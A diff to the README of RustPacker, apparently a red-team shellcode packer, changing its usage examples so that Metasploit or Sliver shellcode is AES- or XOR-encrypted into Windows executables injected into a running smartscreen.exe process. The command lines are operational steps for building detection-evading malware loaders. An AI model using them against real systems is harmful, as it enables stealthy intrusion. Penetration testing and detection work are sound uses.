@@ -37,13 +37,13 @@ From any internet-connected OS with either Podman or Docker installed:
 - `git clone https://github.com/Nariod/RustPacker.git`
 - `cd RustPacker/`
 - `podman build -t rustpacker -f Dockerfile`. This operation may take a while.
-- Paste your shellcode file in the `shared` folder, and create your first binary :
-- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.raw -i syscrt -e aes -b exe`
+- Paste your shellcode file in the `shared` folder, and create your first binary targeting a running `smartscreen` process:
+- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.raw -i syscrt -e aes -b exe -t smartscreen.exe`
 - Retrieve the output binary along with the Rust source files in `output_[RANDOM_NAME]`: `target/x86_64-pc-windows-gnu/release/`
 
 For regular use, you can set an alias:
 - On Linux host: `alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'`
-- Then: `rustpacker -f shared/calc.raw -i syscrt -e aes -b exe`
+- Then: `rustpacker -f shared/calc.raw -i syscrt -e aes -b exe -t smartscreen.exe`
 
 # Full documentation
 
@@ -57,7 +57,7 @@ You can generate raw MSF shellcode using msfvenom's raw format. Ex:
 ### Sliver
 You can generate raw [Sliver](https://github.com/BishopFox/sliver) shellcode using Sliver's "--format shellcode". Ex:
 - `generate --mtls 127.0.0.1:443 --format shellcode --os windows --evasion`
-- You can use Shikata Ga Nai (SGN) Sliver encoder if prompted. RustPacker templates now use RWX memory regions (not OPSEC safe), which are required for SGN to work.
+- You can use Shikata Ga Nai (SGN) Sliver encoder if prompted. RustPacker templates now use RWX memory regions (not really OPSEC safe), which are required for SGN to work.
 
 ## Install Rustpacker
 
@@ -68,12 +68,12 @@ From any internet-connected OS with either Podman or Docker installed:
 - `cd RustPacker/`
 - `podman build -t rustpacker -f Dockerfile`
 - Paste your shellcode file in the `shared` folder
-- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.raw -i ntcrt -e xor -b exe`
+- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.raw -i ntcrt -e xor -b exe -t smartscreen.exe`
 - Retrieve the output binary along with the Rust source files in the `output_RANDOM_NAME` folder in `shared`
 
 For regular use, you can set an alias:
 - On Linux host: `alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'`
-- Then: `rustpacker -f shared/calc.raw -i ntcrt -e xor -b exe`
+- Then: `rustpacker -f shared/calc.raw -i ntcrt -e xor -b exe -t smartscreen.exe`
 
 ### Manual install on Kali
 Install dependencies:
@@ -88,7 +88,7 @@ Install Rust:
 Run RustPacker:
 - `git clone https://github.com/Nariod/RustPacker.git`
 - `cd RustPacker/`
-- `cargo run -- -f shared/calc.raw -i ntcrt -e xor -b exe`
+- `cargo run -- -f shared/calc.raw -i ntcrt -e xor -b exe -t smartscreen.exe`
 
 ## Use Rustpacker
 For now, you can choose from the following templates:
